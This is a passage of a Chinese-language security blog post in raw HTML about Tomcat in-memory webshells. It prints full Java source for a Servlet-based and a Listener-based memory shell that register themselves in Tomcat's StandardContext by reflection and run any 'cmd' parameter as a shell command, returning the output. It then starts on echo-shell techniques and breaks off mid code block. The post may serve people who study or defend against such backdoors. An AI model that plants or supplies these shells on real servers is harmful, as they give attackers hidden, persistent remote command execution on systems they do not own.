                     data-src="R:\notes\java\pic\watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2FuZ3J5X3Byb2dyYW0=,size_16,color_FFFFFF,t_70-16673738718869.png"
                      alt="img"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="R:\notes\java\pic\watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2FuZ3J5X3Byb2dyYW0=,size_16,color_FFFFFF,t_70-166737390543912.png"
                      alt="img"
                ></p>
<p>首先获取Context下所有的Wapper类，并获取到每个Servlet的启动顺序，删选出 &gt;&#x3D; 0 的项加载到一个存放Wapper的list中。</p>
<p>如果在web.xml 中servlet未声明  load-on-startup 的值，则默认-1，表示不加载</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;load-on-startup&gt;1&lt;/load-on-startup&gt;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="R:\notes\java\pic\watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2FuZ3J5X3Byb2dyYW0=,size_16,color_FFFFFF,t_70-166737397584915.png"
                      alt="img"
                ></p>
<p><strong>则该Servlet不会被动态添加到容器：</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="R:\notes\java\pic\watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2FuZ3J5X3Byb2dyYW0=,size_16,color_FFFFFF,t_70-166737399110518.png"
                      alt="img"
                ></p>
<p><strong>然后对每个wapper进行装载：</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="R:\notes\java\pic\watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2FuZ3J5X3Byb2dyYW0=,size_16,color_FFFFFF,t_70-166737404687621.png"
                      alt="img"
                ></p>
<blockquote>
<p>装载：启动服务器时加载Servlet的实例</p>
<p>初始化：web服务器启动时或web服务器接收到请求时，或者两者之间的某个时刻启动。初始化工作有init()方法负责执行完成</p>
<p>调用：即每次调用Servlet的service()，从第一次到以后的多次访问，都是只是调用doGet()或doPost()方法（doGet、doPost内部实现，具体参照HttpServlet类service()的重写）（和之前filter写dofilter是一样的目的）</p>
<p>销毁：停止服务器时调用destroy()方法，销毁实例</p>
</blockquote>
<p><strong>因此severlet内存马的构建思路差不多就有了</strong></p>
<blockquote>
<p>context 中获取StandardContext 对象</p>
<p>使用 Wrapper 封装我们的 Servlet </p>
<p>向 standardContext 的 children 中添加我们封装好的 wrapper</p>
</blockquote>
<h3 id="正式书写内存马"><a href="#正式书写内存马" class="headerlink" title="正式书写内存马"></a>正式书写内存马</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.tomcat.memshell.Servlet;</span><br><span class="line"><span class="keyword">import</span> com.tomcat.util.ClassUtil;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.Wrapper;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.StandardContext;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">KoishiMemServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">urlPattern</span> <span class="operator">=</span> <span class="string">&quot;/koishi&quot;</span>;</span><br><span class="line">            <span class="comment">//String urlPattern = &quot;*&quot;;</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">servletName</span> <span class="operator">=</span> <span class="string">&quot;cirno&quot;</span>;</span><br><span class="line">            <span class="comment">// 从 request 中获取 servletContext</span></span><br><span class="line">            <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> req.getSession().getServletContext();</span><br><span class="line">            <span class="comment">// 如果已有此 servletName 的 Servlet，则不再重复添加</span></span><br><span class="line">            <span class="keyword">if</span>(servletContext.getServletRegistration(servletName) == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="comment">// 反射获取 context，和 filter 差不多</span></span><br><span class="line">                <span class="type">Field</span> <span class="variable">servletfield</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">                servletfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) servletfield.get(servletContext);</span><br><span class="line"></span><br><span class="line">                <span class="type">Field</span> <span class="variable">contextfield</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">                contextfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) contextfield.get(applicationContext);</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 从 request 的 ServletContext 对象中循环判断获取 Tomcat StandardContext 对象</span></span><br><span class="line"><span class="comment">                StandardContext o = null;</span></span><br><span class="line"><span class="comment">                while (o == null) &#123;</span></span><br><span class="line"><span class="comment">                    Field f = servletContext.getClass().getDeclaredField(&quot;context&quot;);</span></span><br><span class="line"><span class="comment">                    f.setAccessible(true);</span></span><br><span class="line"><span class="comment">                    Object object = f.get(servletContext);</span></span><br><span class="line"><span class="comment">                    if (object instanceof ServletContext) &#123;</span></span><br><span class="line"><span class="comment">                        servletContext = (ServletContext) object;</span></span><br><span class="line"><span class="comment">                    &#125; else if (object instanceof StandardContext) &#123;</span></span><br><span class="line"><span class="comment">                        o = (StandardContext) object;</span></span><br><span class="line"><span class="comment">                    &#125;</span></span><br><span class="line"><span class="comment">                &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">                <span class="comment">//新建servlet</span></span><br><span class="line">                <span class="comment">//Class&lt;?&gt; classServlet = ClassUtil.getClass(ClassUtil.SERVLET_STRING);</span></span><br><span class="line">                <span class="type">Servlet</span> <span class="variable">servlet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Servlet</span>() &#123;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(ServletConfig servletConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line"></span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="keyword">public</span> ServletConfig <span class="title function_">getServletConfig</span><span class="params">()</span> &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">                        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> servletRequest.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">                        <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">                        <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">                        <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                            isLinux = <span class="literal">false</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, cmd&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd&#125;;</span><br><span class="line">                        <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">                        <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\a&quot;</span>);</span><br><span class="line">                        <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                        <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> servletResponse.getWriter();</span><br><span class="line">                        out.println(output);</span><br><span class="line">                        out.flush();</span><br><span class="line">                        out.close();</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="keyword">public</span> String <span class="title function_">getServletInfo</span><span class="params">()</span> &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;;</span><br><span class="line"></span><br><span class="line">           <span class="comment">// 使用 Wrapper 封装 Servlet</span></span><br><span class="line">                <span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> standardContext.createWrapper();</span><br><span class="line">                <span class="comment">// 设置为1才会将Servlet添加至容器</span></span><br><span class="line">                <span class="comment">// 当值为0或者大于0时，表示容器在应用启动时就加载这个servlet；读取 web.xml中的每个Servlet 或者新建Servlet 默认是 -1</span></span><br><span class="line">                wrapper.setLoadOnStartup(<span class="number">1</span>);</span><br><span class="line">                wrapper.setName(servletName);</span><br><span class="line">                wrapper.setServlet(servlet);</span><br><span class="line">                wrapper.setServletClass(servlet.getClass().getName());</span><br><span class="line">            <span class="comment">// 向 children 中添加 wrapper</span></span><br><span class="line">                standardContext.addChild(wrapper);</span><br><span class="line">            <span class="comment">// 添加 servletMappings</span></span><br><span class="line">                standardContext.addServletMapping(urlPattern, servletName);</span><br><span class="line">                <span class="type">PrintWriter</span> <span class="variable">writer</span> <span class="operator">=</span> resp.getWriter();</span><br><span class="line">                writer.println(<span class="string">&quot;inject KoishiMemServlet success !&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>





<h2 id="四、Listener内存马"><a href="#四、Listener内存马" class="headerlink" title="四、Listener内存马"></a>四、Listener内存马</h2><h3 id="知识"><a href="#知识" class="headerlink" title="知识"></a>知识</h3><p>请求网站的时候, 程序先执行listener监听器的内容：Listener -&gt; Filter -&gt; Servlet</p>
<p>在应用中可能调用的监听器如下：</p>
<blockquote>
<ul>
<li><p>ServletContextListener：用于监听整个 Servlet 上下文（创建、销毁）</p>
</li>
<li><p>ServletContextAttributeListener：对 Servlet 上下文属性进行监听（增删改属性）</p>
</li>
<li><p>ServletRequestListener：对 Request 请求进行监听（创建、销毁）</p>
</li>
<li><p>ServletRequestAttributeListener：对 Request 属性进行监听（增删改属性）</p>
</li>
<li><p>javax.servlet.http.HttpSessionListener：对 Session 整体状态的监听</p>
</li>
<li><p>javax.servlet.http.HttpSessionAttributeListener：对 Session 属性的监听</p>
</li>
</ul>
</blockquote>
<p>在 ServletRequestListener 接口中，提供两个方法：<code>requestInitialized</code> 和 <code>requestDestroyed</code>，两个方法均接收 ServletRequestEvent 作为参数，ServletRequestEvent 中又储存了 ServletContext 对象和 ServletRequest 对象，因此在访问请求过程中我们可以在 request 创建和销毁时实现自己的恶意代码，完成内存马的实现。 从中还可以获取到 StandardContext 对象，也就是可以在Listener的基础上添加动态FIlter。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="R:\notes\java\pic\1623578410672.png"
                      alt="img"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="R:\notes\java\pic\1623640456652.png"
                      alt="img"
                ></p>
<p>Tomcat 中 EventListeners 存放在 StandardContext 的 applicationEventListenersObjects 属性中，同样可以使用 StandardContext 的相关 add 方法添加。</p>
<p>除了 EventListener，Tomcat 还存在了 LifecycleListener。但是用起来一定是不如 ServletRequestListener。 因为实现了<code>LifecycleListener</code>接口的监听器一般作用于tomcat初始化启动阶段，此时客户端的请求还没进入解析阶段，不适合用于内存马 。</p>
<p>（也就是说，Listener内存马大多数都是使用的他的 requestDestroyed 方法来保存我们的恶意代码，这样能确保被解析了）</p>
<h3 id="内存马代码"><a href="#内存马代码" class="headerlink" title="内存马代码"></a>内存马代码</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.tomcat.memshell.Listener;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.tomcat.util.ClassUtil;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.Request;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.StandardContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">KoishiMemListener</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="comment">// 获取 StandardContext#addApplicationEventListener</span></span><br><span class="line">            <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> req.getSession().getServletContext();</span><br><span class="line">            <span class="type">Field</span> <span class="variable">servletfield</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">            servletfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) servletfield.get(servletContext);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">contextfield</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">            contextfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) contextfield.get(applicationContext);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//新建 Listener 不用像之前那样使用 wrapper 包装了，直接add即可</span></span><br><span class="line">            <span class="comment">//Class&lt;?&gt; classListener = ClassUtil.getClass(ClassUtil.LISTENER_STRING);</span></span><br><span class="line">            <span class="type">MyListener</span> <span class="variable">listener</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyListener</span>();</span><br><span class="line">            standardContext.addApplicationEventListener(listener);</span><br><span class="line"></span><br><span class="line">            <span class="type">PrintWriter</span> <span class="variable">writer</span> <span class="operator">=</span> resp.getWriter();</span><br><span class="line">            writer.println(<span class="string">&quot;inject KoishiMemListener success !&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyListener</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">            <span class="type">HttpServletRequest</span> <span class="variable">req</span> <span class="operator">=</span> (HttpServletRequest) sre.getServletRequest();</span><br><span class="line">            <span class="keyword">if</span> (req.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    in = Runtime.getRuntime().exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>,<span class="string">&quot;/c&quot;</span>,req.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125;).getInputStream();</span><br><span class="line">                    <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">                    <span class="type">String</span> <span class="variable">out</span> <span class="operator">=</span> s.hasNext()?s.next():<span class="string">&quot;&quot;</span>;</span><br><span class="line">                    <span class="type">Field</span> <span class="variable">requestF</span> <span class="operator">=</span> req.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">                    requestF.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                    <span class="type">Request</span> <span class="variable">request</span> <span class="operator">=</span> (Request)requestF.get(req);</span><br><span class="line">                    request.getResponse().getWriter().write(out);</span><br><span class="line">                    request.getResponse().getWriter().flush();</span><br><span class="line">                    request.getResponse().getWriter().close();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">catch</span> (IOException e) &#123;&#125;</span><br><span class="line">                <span class="keyword">catch</span> (NoSuchFieldException e) &#123;&#125;</span><br><span class="line">                <span class="keyword">catch</span> (IllegalAccessException e) &#123;&#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>



<h2 id="五、Tomcat-回显马"><a href="#五、Tomcat-回显马" class="headerlink" title="五、Tomcat 回显马"></a>五、Tomcat 回显马</h2><p>tomcat马构造基础 <a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/nice0e3/p/14622879.html" >Java安全之基于Tomcat实现内存马 - nice_0e3 - 博客园 (cnblogs.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>本段参考：</p>
<p>文章一： <a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/nice0e3/p/14891711.html#0x01-tomcat%E9%80%9A%E7%94%A8%E5%9B%9E%E6%98%BE" >Java安全之反序列化回显与内存马 - nice_0e3 - 博客园 (cnblogs.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>文章二：<a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/akka1/p/16201272.html#autoid-3-0-0" >Tomcat通用回显学习 - akka1 - 博客园 (cnblogs.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h3 id="通用回显"><a href="#通用回显" class="headerlink" title="通用回显"></a>通用回显</h3><blockquote>
<p>按照我个人的理解来说其实只要能拿到<code>Request</code> 和<code>Response</code>对象即可进行回显的构造，当然这也是众多方式的一种。也是目前用的较多的方式。比如在Tomcat 全局存储的<code>Request</code> 和<code>Response</code>对象，进行获取后则可以在tomcat这个容器下进行回显。而某些漏洞的方式会从漏洞的位置去寻找存储<code>Request</code> 和<code>Response</code>对象的地方。</p>
</blockquote>
<p><a class="link"   target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzIwNDA2NDk5OQ==&mid=2651374294&idx=3&sn=82d050ca7268bdb7bcf7ff7ff293d7b3" >基于全局储存的新思路 | Tomcat的一种通用回显方法研究 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>说明在Tomcat启动的时候会调用该位置的 dorun 方法</p>
<p>大致思路</p>
<blockquote>
<ul>
<li><p>获取到<code>Http11Processor</code>对象即可获取到<code>Request</code>，<code>Response</code> ， <code>Http11Processor</code>继承<code>AbstractProcessor</code>类。 </p>
</li>
<li><p>而<code>AbstractProcessor</code>类中可见有<code>Request</code>，<code>Response</code>这两对象。 <code>AbstractProcessor</code>调用<code>this.register</code>将前面创建的<code>Http11Processor</code>对象进行传递。 随后调用<code>processor.getRequest().getRequestProcessor()</code>获取<code>RequestInfo</code> 。 </p>
</li>
<li><p>调用获取到的<code>RequestInfo</code>,这里为<code>rp</code>。rp的<code>setGlobalProcessor</code>将global进行传递，而<code>setGlobalProcessor</code>方法里面会调用<code>global.addRequestProcessor</code>将rp添加进去。 </p>
</li>
<li><p>再往后需要寻找存储<code>AbstractProtocol</code>类或继承<code>AbstractProtocol</code>类的子类。这里寻找到的是<code>Connector</code>成员变量中为<code>protocolHandler</code>属性的值，而 <code>Http11AprProtocol</code>类实现了该接口。 </p>
</li>
<li><p>在Tomcat启动过程中会将Connector放入Service中。 </p>
</li>
<li><p>StandardContext 中有我们需要的 service。</p>
</li>
</ul>
</blockquote>
<p>最后调用链为</p>
<p>（前面几步通过 <code>currentThread</code> 最终获取<code>StandardContext</code>， 因为我的tomcat版本问题，我改用了反射获取的方式）</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WebappClassLoaderBase---&gt;ApplicationContext(getResources().getContext())---&gt;StandardService---&gt;Connector---&gt;AbstractProtocol$ConnectoinHandler---&gt;RequestGroupInfo(global)---&gt;RequestInfo---&gt;Request---&gt;Response</span><br></pre></td></tr></table></figure></div>





<h4 id="tomcat马通用回显马："><a href="#tomcat马通用回显马：" class="headerlink" title="tomcat马通用回显马："></a><strong>tomcat马通用回显马：</strong></h4><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span 